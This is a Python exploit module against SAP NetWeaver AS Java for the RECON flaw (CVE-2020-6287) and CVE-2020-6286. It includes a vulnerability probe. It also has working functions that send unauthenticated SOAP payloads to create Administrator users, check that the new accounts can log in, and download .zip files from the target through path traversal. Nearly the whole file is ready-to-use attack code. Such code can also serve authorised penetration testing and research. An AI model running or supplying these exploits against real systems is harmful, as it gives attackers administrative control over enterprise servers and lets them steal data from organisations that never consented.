#!/usr/bin/env python3
"""
CVE-2020-6287 (RECON) + CVE-2020-6286 — SAP NetWeaver AS Java
LM Configuration Wizard unauthenticated admin-user creation.

Three entry points:
  - check_cve_2020_6287()            safe HEAD/GET probe
  - exploit_create_user()            create UME user via CTCWebService SOAP
  - exploit_create_admin()           shorthand for role=Administrator

The SOAP templates are reproduced from chipik/SAP_RECON on GitHub.
"""

from __future__ import annotations

import base64
import logging
import random
import ssl
import urllib.error
import urllib.request
from typing import Optional

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")

_CTC_PATH = "/CTCWebService/CTCWebServiceBean"
_LMC_PATH = "/LMConfigurationWizard"


# ---------------------------------------------------------------------------
# SOAP templates (from chipik/SAP_RECON)
# ---------------------------------------------------------------------------

_SOAP_ADMIN_USER = """\
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:CTCWebServiceSi">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:executeSynchronious>
      <identifier>
        <component>sap.com/tc~lm~config~content</component>
        <path>content/Netweaver/PI_PCK/PCK/PCKProcess.cproc</path>
      </identifier>
      <contextMessages>
        <baData>{ba_data}</baData>
        <name>Netweaver.PI_PCK.PCK</name>
      </contextMessages>
    </urn:executeSynchronious>
  </soapenv:Body>
</soapenv:Envelope>"""

_SOAP_PLAIN_USER = """\
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:CTCWebServiceSi">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:executeSynchronious>
      <identifier>
        <component>sap.com/tc~lm~config~content</component>
        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
        <type></type>
      </identifier>
      <contextMessages>
        <baData>{ba_data}</baData>
        <name>userDetails</name>
      </contextMessages>
    </urn:executeSynchronious>
  </soapenv:Body>
</soapenv:Envelope>"""

# baData payloads: base64 of an XML blob the CTC metamodel parses as the
# new user's attributes.  Structures taken verbatim from chipik/SAP_RECON.

# Admin path (PCKProcess.cproc / name=Netweaver.PI_PCK.PCK).
# {rand} is a throw-away role-name placeholder for the non-admin roles;
# only the first Administrator assignment actually creates the admin.
_BA_ADMIN = """\
<PCK>
  <Usermanagement>
    <SAP_XI_PCK_CONFIG>
      <roleName>Administrator</roleName>
    </SAP_XI_PCK_CONFIG>
    <SAP_XI_PCK_COMMUNICATION>
      <roleName>{rand}</roleName>
    </SAP_XI_PCK_COMMUNICATION>
    <SAP_XI_PCK_MONITOR>
      <roleName>{rand}</roleName>
    </SAP_XI_PCK_MONITOR>
    <SAP_XI_PCK_ADMIN>
      <roleName>{rand}</roleName>
    </SAP_XI_PCK_ADMIN>
    <PCKUser>
      <userName secure="true">{username}</userName>
      <password secure="true">{password}</password>
    </PCKUser>
    <PCKReceiver>
      <userName>{rand}</userName>
      <password secure="true">{rand}</password>
    </PCKReceiver>
    <PCKMonitor>
      <userName>{rand}</userName>
      <password secure="true">{rand}</password>
    </PCKMonitor>
    <PCKAdmin>
      <userName>{rand}</userName>
      <password secure="true">{rand}</password>
    </PCKAdmin>
  </Usermanagement>
</PCK>"""

# Plain user path (SPC_UserManagement.cproc / name=userDetails).
_BA_PLAIN = ("<root><user><JavaOrABAP>java</JavaOrABAP>"
             "<username>{username}</username>"
             "<password>{password}</password>"
             "<userType>J</userType></user></root>")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_url(host: str, port: int, path: str, use_https: bool) -> str:
    scheme = "https" if use_https else "http"
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{scheme}://{host}:{port}{path}"


def _head(url: str, timeout: float) -> int:
    """HEAD request — return HTTP status, 0 on network error."""
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, method="HEAD",
                                  headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _get(url: str, timeout: float) -> int:
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _post_soap(url: str, body: str, timeout: float) -> tuple:
    """POST a SOAP body. Returns (status, response_text, error_str).

    A read-timeout is reported with status=-1 so callers can distinguish
    it from a hard network error (status=0).  The chipik PoC treats a
    read-timeout on the admin path as a success signal.
    """
    ctx = ssl._create_unverified_context()
    data = body.encode("utf-8")
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"User-Agent": _UA,
                 "Content-Type": "text/xml;charset=UTF-8"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("latin1", errors="replace"), ""
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode("latin1", errors="replace")
        except Exception:
            body_text = ""
        return e.code, body_text, ""
    except TimeoutError as e:
        return -1, "", f"read timeout after {timeout}s"
    except (urllib.error.URLError, OSError) as e:
        msg = str(e)
        if "timed out" in msg.lower() or "timeout" in msg.lower():
            return -1, "", msg
        return 0, "", msg


# ---------------------------------------------------------------------------
# Scanner (non-destructive)
# ---------------------------------------------------------------------------

def check_cve_2020_6287(host: str, port: int = 50000,
                          use_https: bool = False,
                          timeout: float = 10.0) -> dict:
    """Safe probe for CVE-2020-6287 (RECON).

    HEAD /CTCWebService/CTCWebServiceBean → 200 means vulnerable.
    Fallback: GET /LMConfigurationWizard → 200 also suggests the wizard
    is exposed.  Both are idempotent read-only requests.

    Returns dict:
        vulnerable, reachable, http_status, evidence, url
    """
    result = {"vulnerable": False, "reachable": False,
              "http_status": 0, "evidence": "", "url": ""}

    # Primary check: HEAD on CTCWebService
    url = _build_url(host, port, _CTC_PATH, use_https)
    result["url"] = url
    status = _head(url, timeout)
    result["http_status"] = status

    if status == 0:
        result["evidence"] = "network error / port not reachable"
        return result

    result["reachable"] = True

    if status == 200:
        result["vulnerable"] = True
        result["evidence"] = (
            "CTCWebService responded HTTP 200 to HEAD — "
            "LM Configuration Wizard is exposed without authentication")
        return result

    if status == 404:
        result["evidence"] = (
            "CTCWebService returned 404 — endpoint removed or patched "
            "(SAP Note 2934135 applied)")
        return result

    if status == 403:
        result["evidence"] = "CTCWebService returned 403 — access restricted"
        return result

    # Fallback: try the LMConfigurationWizard URL
    url2 = _build_url(host, port, _LMC_PATH, use_https)
    status2 = _get(url2, timeout)
    if status2 == 200:
        result["vulnerable"] = True
        result["http_status"] = status2
        result["evidence"] = (
            f"CTCWebService HEAD={status} but /LMConfigurationWizard "
            f"responded HTTP 200 — wizard UI is accessible")
        result["url"] = url2
        return result

    result["evidence"] = (
        f"CTCWebService HEAD={status}, "
        f"LMConfigurationWizard GET={status2} — probably not vulnerable")
    return result


# ---------------------------------------------------------------------------
# Exploit — user creation
# ---------------------------------------------------------------------------

def exploit_create_user(host: str, port: int, username: str, password: str,
                          role: str = "Administrator",
                          use_https: bool = False,
                          timeout: float = 20.0) -> dict:
    """Create a Java UME user via CVE-2020-6287 (RECON).

    Args:
        role: "Administrator" for admin-level access, "J" for a regular
              Java user.

    Returns dict:
        success, http_status, username, password, role, evidence, url
    """
    url = _build_url(host, port, _CTC_PATH, use_https)
    result = {"success": False, "http_status": 0,
              "username": username, "password": password,
              "role": role, "evidence": "", "url": url}

    if role.lower() in ("administrator", "admin"):
        rand_val = f"ThisIsRnd{random.randint(5000, 10000)}"
        ba_raw = _BA_ADMIN.format(username=username, password=password,
                                   rand=rand_val)
        soap_template = _SOAP_ADMIN_USER
    else:
        ba_raw = _BA_PLAIN.format(username=username, password=password)
        soap_template = _SOAP_PLAIN_USER

    ba_data = base64.b64encode(ba_raw.encode("utf-8")).decode("ascii")
    soap_body = soap_template.format(ba_data=ba_data)

    status, text, err = _post_soap(url, soap_body, timeout)
    result["http_status"] = status

    is_admin = role.lower() in ("administrator", "admin")

    # Read-timeout on the admin path is a documented success signal —
    # the CTC wizard processes the payload for a long time after the
    # user has already been created.  The chipik PoC does the same.
    if status == -1:
        if is_admin:
            result["success"] = True
            result["evidence"] = (
                "Read-timeout from CTCWebService — the wizard typically "
                "creates the admin user before it finishes processing, "
                "so treat as probable success (verify via UME).")
            return result
        result["evidence"] = f"read timeout: {err}"
        return result

    if status == 0 and err:
        result["evidence"] = f"network error: {err}"
        return result

    text_low = text.lower()

    # Success: HTTP 200 and no SOAP fault.
    if status == 200 and "fault" not in text_low:
        result["success"] = True
        result["evidence"] = ("CTCWebService accepted the user-creation "
                              "request (HTTP 200, no SOAP fault)")
        return result

    if "fault" in text_low:
        import re
        m = re.search(r"<faultstring[^>]*>(.*?)</faultstring>",
                       text, re.DOTALL | re.IGNORECASE)
        fault = m.group(1).strip() if m else text[:300]
        result["evidence"] = f"SOAP fault: {fault}"
        return result

    result["evidence"] = f"HTTP {status} — {text[:300]}"
    return result


def exploit_create_admin(host: str, port: int,
                           username: str = "", password: str = "",
                           use_https: bool = False,
                           timeout: float = 20.0) -> dict:
    """Convenience wrapper: create an Administrator-role user.

    If username/password are empty, generates random ones matching the
    PoC's naming convention (sapRpocNNNN / Secure!PwDNNNN).
    """
    if not username:
        n = random.randint(5000, 10000)
        username = f"sapRpoc{n}"
    if not password:
        n = random.randint(5000, 10000)
        password = f"Secure!PwD{n}"
    return exploit_create_user(host, port, username, password,
                                 role="Administrator",
                                 use_https=use_https, timeout=timeout)


# ---------------------------------------------------------------------------
# Post-exploitation: verify the created user can actually log in
# ---------------------------------------------------------------------------

# Protected paths probed to trigger FORM login.  Tried in order until
# one responds — minimum-install Java engines (like some PI-only boxes)
# do not ship /nwa/, so we fall back to paths that are always present.
_LOGIN_PROBE_PATHS = (
    "/nwa/",
    "/useradmin/",
    "/webdynpro/resources/sap.com/tc~lm~webadmin~mainframe~wd/MainFrame",
    "/irj/portal",
    "/monitoring/",
)


def verify_login(host: str, port: int, username: str, password: str,
                   use_https: bool = False, timeout: float = 15.0) -> dict:
    """Verify that a newly-created UME user can authenticate.

    Strategy:
      1. Probe a list of admin-protected paths (NWA, useradmin, portal,
         monitoring…); use the first one that answers with either a
         logon page / redirect-to-logon, or accepts our credentials via
         HTTP Basic.  404 on one path is common on minimum installs —
         we just move on.
      2. For the probe that did respond, submit credentials via
         j_security_check (the standard SAP J2EE FORM login endpoint
         for that context path — it's typically served on the same
         context as the protected resource).
      3. Also try plain HTTP Basic as a final fallback; some AS-Java
         services accept it directly (e.g. /monitoring/).

    Success signals:
      - POST response carries a JSESSIONID / SAP_SESSIONID cookie AND
        the final URL is not on /logon/;
      - OR a Basic-auth GET returns 200/403 (credentials accepted —
        403 just means the probe path was off-limits to this user).
    """
    import http.cookiejar
    import urllib.parse

    result = {"success": False, "http_status": 0, "url": "", "evidence": ""}
    base = ("https" if use_https else "http") + f"://{host}:{port}"
    ctx = ssl._create_unverified_context()

    # Step 1 — find a probe path that actually exists on this engine.
    probe_path = ""
    probe_status = 0
    for path in _LOGIN_PROBE_PATHS:
        try:
            req = urllib.request.Request(base + path,
                                           headers={"User-Agent": _UA})
            with urllib.request.urlopen(req, timeout=timeout,
                                           context=ctx) as r:
                probe_status = r.status
                probe_path = path
                break
        except urllib.error.HTTPError as e:
            if e.code == 404:
                continue  # path not deployed — try next
            # 401/403/redirect → path exists and is protected → perfect
            probe_status = e.code
            probe_path = path
            break
        except Exception:
            continue

    if not probe_path:
        result["evidence"] = ("no admin-protected Java endpoint responded "
                              f"on {base} (tried {', '.join(_LOGIN_PROBE_PATHS)})")
        return result

    result["url"] = base + probe_path
    context = probe_path.rstrip("/").split("/")[1] or "nwa"

    # Step 2 — HTTP Basic fallback first (cheap, works for /monitoring/
    # and /ctc/ endpoints).
    import base64 as _b64
    basic = _b64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        req = urllib.request.Request(
            base + probe_path,
            headers={"User-Agent": _UA,
                     "Authorization": f"Basic {basic}"})
        with urllib.request.urlopen(req, timeout=timeout,
                                       context=ctx) as r:
            result["http_status"] = r.status
            if r.status in (200, 204):
                result["success"] = True
                result["evidence"] = (f"HTTP Basic auth accepted on "
                                       f"{probe_path} (status {r.status})")
                return result
    except urllib.error.HTTPError as e:
        if e.code == 401:
            # Basic auth was actively rejected — a definitive failure,
            # but ONLY on this path; keep the FORM path alive because
            # some paths return 401 for basic auth even when FORM works.
            pass
        elif e.code == 403:
            # 403 after basic-auth = credentials accepted, user lacks
            # authorization for that path.  That still proves login
            # works.
            result["http_status"] = 403
            result["success"] = True
            result["evidence"] = (f"HTTP Basic auth accepted on "
                                   f"{probe_path} (403 — user lacks "
                                   f"permission on this path, but "
                                   f"credentials are valid)")
            return result
    except Exception:
        pass

    # Step 3 — FORM login via j_security_check, scoped to the context
    # of the probe path that actually answered.
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx),
    )
    opener.addheaders = [("User-Agent", _UA)]
    try:
        opener.open(base + probe_path, timeout=timeout).read()
    except urllib.error.HTTPError as e:
        try:
            e.read()
        except Exception:
            pass
    except Exception:
        pass

    form = urllib.parse.urlencode({
        "j_username": username,
        "j_password": password,
        "login_submit": "on",
        "uidPasswordLogon": "Log on",
    }).encode("ascii")
    submit_url = f"{base}/{context}/j_security_check"
    try:
        req = urllib.request.Request(
            submit_url, data=form, method="POST",
            headers={"User-Agent": _UA,
                     "Content-Type": "application/x-www-form-urlencoded"})
        with opener.open(req, timeout=timeout) as r:
            body = r.read().decode("latin1", errors="replace")
            final_url = r.url
            status = r.status
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("latin1", errors="replace")
        except Exception:
            body = ""
        final_url = getattr(e, "url", "") or submit_url
        status = e.code
    except Exception as e:
        result["evidence"] = (f"j_security_check failed on "
                               f"/{context}/: {e}")
        return result

    result["http_status"] = status
    result["url"] = final_url

    body_low = body.lower()
    failure_markers = (
        "logonerror", "logon_error", "authentication failed",
        "user authentication failed", "password is incorrect",
        "incorrect user name", 'name="j_password"',
    )
    if any(m in body_low for m in failure_markers):
        result["evidence"] = ("SAP logon form returned an error marker — "
                              "credentials rejected")
        return result

    if "/logon/" in (final_url or "").lower():
        result["evidence"] = (f"landed back on logon page ({final_url}) — "
                              "credentials rejected")
        return result

    has_session = any(
        c.name.upper().startswith(("JSESSIONID", "SAPSSO",
                                     "MYSAPSSO", "SAP_SESSIONID"))
        for c in cj)
    if has_session:
        result["success"] = True
        result["evidence"] = (f"FORM login succeeded on /{context}/ — "
                              f"session cookie issued, final URL "
                              f"{final_url}")
        return result

    result["evidence"] = (f"ambiguous: probe={probe_path} status={status}, "
                          f"final_url={final_url}, no session cookie, "
                          f"no Basic acceptance")
    return result


# ---------------------------------------------------------------------------
# CVE-2020-6286 — LM Configuration Wizard queryProtocol traversal
# ---------------------------------------------------------------------------
#
# The LM Configuration Wizard's SOAP queryProtocol method builds a filename
# by concatenating `<protocols_dir>/<sessionID>.zip`.  The sessionID is
# user-controlled and unsanitised, allowing absolute-path traversal.  The
# server always appends `.zip`, so only pre-existing .zip files on the
# filesystem can be retrieved (SAP CTS protocol exports, NWA archives,
# user-created zip backups, …).  Binary files without a .zip suffix
# cannot be read via this primitive.

_SOAP_TRAVERSAL = """\
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:CTCWebServiceSi">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:queryProtocol>
      <sessionID>/../../../../../../../../../../../../../../../../../..{path}</sessionID>
    </urn:queryProtocol>
  </soapenv:Body>
</soapenv:Envelope>"""


def download_file_via_traversal(host: str, port: int, remote_zip_path: str,
                                  use_https: bool = False,
                                  timeout: float = 30.0) -> dict:
    """Download a .zip file from the target via CVE-2020-6286 traversal.

    Args:
        remote_zip_path: absolute path to a .zip file on the target
            filesystem.  Passed with or without the .zip extension — the
            server appends .zip itself, so we strip it if the caller left
            it on.  E.g. "/usr/sap/SID/SCS01/work/foo" → reads foo.zip.

    Returns dict:
        success, http_status, bytes_read, data (raw bytes or b""),
        evidence, url, path
    """
    import re

    url = _build_url(host, port, _CTC_PATH, use_https)
    result = {"success": False, "http_status": 0, "bytes_read": 0,
              "data": b"", "evidence": "", "url": url,
              "path": remote_zip_path}

    # Normalise: strip trailing .zip (server re-adds it).
    path = remote_zip_path
    if path.lower().endswith(".zip"):
        path = path[:-4]

    body = _SOAP_TRAVERSAL.format(path=path)
    status, text, err = _post_soap(url, body, timeout)
    result["http_status"] = status

    if status <= 0:
        result["evidence"] = (err or
            "no HTTP response (timeout or network error)")
        return result

    if status != 200:
        result["evidence"] = f"HTTP {status} — {text[:300]}"
        return result

    text_low = text.lower()
    if "fault" in text_low:
        m = re.search(r"<faultstring[^>]*>(.*?)</faultstring>",
                       text, re.DOTALL | re.IGNORECASE)
        fault = m.group(1).strip() if m else text[:300]
        result["evidence"] = f"SOAP fault: {fault}"
        return result

    # Extract the base64 payload from <return>...</return>
    m = re.search(r"<return[^>]*>(.*?)</return>", text,
                    re.DOTALL | re.IGNORECASE)
    if not m:
        result["evidence"] = ("HTTP 200 but no <return> element — "
                              "server accepted the call but produced "
                              "no payload (file probably missing)")
        return result

    b64 = m.group(1).strip()
    if not b64:
        result["evidence"] = (f"empty <return> — file {path}.zip not "
                              f"found on server")
        return result

    try:
        raw = base64.b64decode(b64, validate=False)
    except Exception as e:
        result["evidence"] = f"base64 decode failed: {e}"
        return result

    result["success"] = True
    result["data"] = raw
    result["bytes_read"] = len(raw)
    result["evidence"] = (f"downloaded {len(raw)} bytes from "
                          f"{path}.zip via queryProtocol traversal")
    return result

